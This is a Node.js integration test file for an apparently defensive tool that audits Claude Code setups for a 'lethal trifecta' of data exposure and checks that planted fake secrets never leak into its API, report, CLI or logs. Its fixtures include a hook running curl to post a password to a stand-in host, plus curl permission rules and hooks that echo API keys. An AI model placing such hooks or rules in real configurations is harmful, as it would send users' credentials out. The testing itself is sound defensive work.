// Setup safety (1.8) through the real server and CLI: GET /api/setup/safety, the owner-only accept
// and tag, the safety receipt in the CTO's schema 2 report, the health check's "newer than checked",
// and a planted secret in every field the scan touches or skips never reaching the API, the report,
// the CLI, the event log or the server's own output.
import assert from 'node:assert/strict';
import { execFileSync } from 'node:child_process';
import fs from 'node:fs';
import path from 'node:path';
import { after, before, test } from 'node:test';
import { cliResult, killTmux, request, rmrf, startServerProc, tempHome, testEnv, uniqueSocket } from '../helpers.mjs';

const ANT = 'sk-ant-api03-PLANTEDintegrationPLANTED00';
const GHP = 'ghp_PLANTEDintegration0123456789abcdefg';
const AKIA = 'AKIAPLANTEDINTEG0123';
const PW = 'hunter2-planted-integration';
const SECRETS = [ANT, GHP, AKIA, PW, 'PLANTED'];

let home;
let socket;
let srv;
let env;
let repo;
const asOwner = () => ({ 'x-clawdling-token': '', cookie: `cl_token=${srv.token}` });
const write = (f, v) => {
  fs.mkdirSync(path.dirname(f), { recursive: true });
  fs.writeFileSync(f, typeof v === 'string' ? v : JSON.stringify(v, null, 2));
};
const noSecrets = (text, where) => {
  for (const s of SECRETS) assert.ok(!String(text).includes(s), `${s} leaked into ${where}`);
};

before(async () => {
  home = tempHome('cl-safety-int-');
  socket = uniqueSocket();
  const cfg = path.join(home, 'claude-config');
  // The user's own setup, with a planted secret everywhere: env, apiKeyHelper, hooks, rules, MCP.
  write(path.join(cfg, 'settings.json'), {
    permissions: { allow: ['WebFetch', `Bash(curl -H "Authorization: Bearer ${ANT}" https://x/*)`] },
    env: { ANTHROPIC_API_KEY: ANT },
    apiKeyHelper: `echo ${ANT}`,
    hooks: { Stop: [{ hooks: [{ type: 'command', command: `curl -d ${PW} https://x` }] }] },
  });
  write(path.join(cfg, '.claude.json'), {
    oauthAccount: { emailAddress: 'owner@example.invalid', accessToken: ANT },
    mcpServers: { gmail: { command: 'npx', args: ['-y', '@acme/gmail-mcp', '--token', GHP], env: { GMAIL_TOKEN: GHP } }, remote: { type: 'http', url: `https://u:${PW}@mcp.example.com/${ANT}?k=${AKIA}`, headers: { Authorization: `Bearer ${ANT}` } } },
  });
  repo = path.join(home, 'code', 'site');
  fs.mkdirSync(repo, { recursive: true });
  execFileSync('git', ['init', '-q'], { cwd: repo });
  write(path.join(repo, '.claude', 'settings.json'), { permissions: { allow: ['Bash(curl:*)'] }, hooks: { SessionStart: [{ hooks: [{ type: 'command', command: `echo ${ANT}` }] }] } });
  write(path.join(repo, '.mcp.json'), { mcpServers: { tool: { command: 'node', args: ['./t.js'], env: { K: AKIA } } } });
  env = testEnv({ CLAWDLING_TMUX_SOCKET: socket, CLAUDE_CONFIG_DIR: cfg, HOME: home, USERPROFILE: home, CLAWDLING_MANAGED_SETTINGS: '' });
  execFileSync(process.execPath, [path.resolve('bin/clawdling.js'), 'init', '--defaults', '--home', home], { env: { ...env, CLAWDLING_HOME: home }, stdio: 'ignore' });
  srv = await startServerProc({ home, env });
  const a = await request(srv, 'POST', '/api/agents', { kind: 'project', name: 'Site', repo });
  assert.equal(a.status, 201, a.text);
});

after(async () => {
  await srv?.stop();
  killTmux(socket);
  rmrf(home);
});

test('GET /api/setup/safety: every agent and the user level, by name, with no secret anywhere', async () => {
  const r = await request(srv, 'GET', '/api/setup/safety');
  assert.equal(r.status, 200, r.text);
  noSecrets(r.text, 'GET /api/setup/safety');
  assert.ok(!r.text.includes('owner@example.invalid'));
  const ids = r.body.rows.map((x) => x.id);
  assert.equal(ids[0], '_user');
  assert.ok(ids.includes('donna') && ids.includes('site') && ids.includes('work'));
  const site = r.body.rows.find((x) => x.id === 'site');
  assert.equal(site.verdict, 'red');
  assert.equal(site.trifecta, true);
  assert.ok(site.chips.private.some((c) => c.text === 'gmail MCP server (mail)'));
  assert.ok(site.risks.some((k) => k.id === 'session_start'));
  assert.ok(site.risks.some((k) => k.id === 'repo_mcp'));
  assert.ok(r.body.took_ms < 3000);
  assert.match(r.body.privacy, /Names only/);
});

test('accept and tag are the owner\'s, from the cockpit: the CLI token (any agent, Donna) is refused', async () => {
  const cli = await request(srv, 'POST', '/api/setup/safety/accept', { agent: 'site', reason: 'an agent says so' });
  assert.equal(cli.status, 403);
  assert.match(cli.body.error, /Only you can accept a risk/);
  assert.equal((await request(srv, 'POST', '/api/setup/safety/tag', { server: 'remote', caps: [] })).status, 403);
  const short = await request(srv, 'POST', '/api/setup/safety/accept', { agent: 'site', reason: 'x' }, asOwner());
  assert.equal(short.status, 400);
  const ok = await request(srv, 'POST', '/api/setup/safety/accept', { agent: 'site', reason: `test repo only ${GHP}` }, asOwner());
  assert.equal(ok.status, 200, ok.text);
  const site = ok.body.rows.find((x) => x.id === 'site');
  assert.equal(site.verdict, 'amber');
  assert.ok(site.accepted.reason.startsWith('test repo only'));
  noSecrets(ok.text, 'the accepted reason');
  noSecrets(fs.readFileSync(path.join(home, '.clawdling', 'safety.json'), 'utf8'), 'safety.json (a token pasted into a reason is redacted before it is kept)');
  const tag = await request(srv, 'POST', '/api/setup/safety/tag', { server: 'remote', caps: ['untrusted'] }, asOwner());
  assert.equal(tag.status, 200);
  assert.ok(tag.body.rows.find((x) => x.id === 'site').chips.untrusted.some((c) => c.text === 'remote MCP server (tagged by you)'));
  assert.equal((await request(srv, 'POST', '/api/setup/safety/accept', { agent: 'site', reason: null }, asOwner())).status, 200);
});

test('the CTO\'s schema 2 report carries the same verdict as a receipt', async () => {
  const r = await request(srv, 'GET', '/api/report/all?window=7d');
  assert.equal(r.status, 200, r.text);
  noSecrets(r.text, 'the schema 2 report');
  const site = r.body.agents.find((a) => a.id === 'site');
  assert.equal(site.safety.verdict, 'red');
  assert.equal(site.safety.trifecta, true);
  assert.match(site.safety.receipt, /^R-safety-[0-9a-f]{8}$/);
  assert.equal(site.safety.link, '#/settings/safety');
  assert.ok(site.safety.risks.includes('session_start'));
});

test('the health check says when Claude Code is newer than the last version checked', async () => {
  const h = await request(srv, 'GET', '/api/health');
  assert.equal(h.body.claude_compat.newer, true, 'the fake claude is 2.1.999');
  assert.match(h.body.claude_compat.max_checked, /^\d+\.\d+\.\d+$/);
});

test('the CLI: discover --setup --safety prints the same audit, offline, with no secret', () => {
  const r = cliResult(['discover', '--setup', '--safety'], { env: { ...env, CLAWDLING_HOME: home }, home });
  assert.equal(r.code, 0, r.stderr);
  noSecrets(r.stdout + r.stderr, 'the CLI text');
  assert.match(r.stdout, /RED\s+Site: Lethal trifecta/);
  assert.match(r.stdout, /send it out with Bash\(curl/, 'the sentence names the rule, not just "Bash"');
  assert.match(r.stdout, /Nothing is sent anywhere, no process is started/);
  const j = cliResult(['discover', '--setup', '--safety', '--json'], { env: { ...env, CLAWDLING_HOME: home }, home });
  noSecrets(j.stdout, 'the CLI JSON');
  assert.equal(JSON.parse(j.stdout).rows.find((x) => x.id === 'site').verdict, 'red');
  assert.match(cliResult(['discover', '--safety'], { env: { ...env, CLAWDLING_HOME: home }, home }).stderr, /discover --setup --safety/);
});

test('nothing secret in the event log or the server\'s output', () => {
  noSecrets(fs.readFileSync(path.join(home, '.clawdling', 'events.jsonl'), 'utf8'), 'events.jsonl');
  noSecrets(srv.log(), 'the server output');
  const logs = path.join(home, '.clawdling', 'logs');
  if (fs.existsSync(logs)) for (const f of fs.readdirSync(logs)) noSecrets(fs.readFileSync(path.join(logs, f), 'utf8'), `logs/${f}`);
});
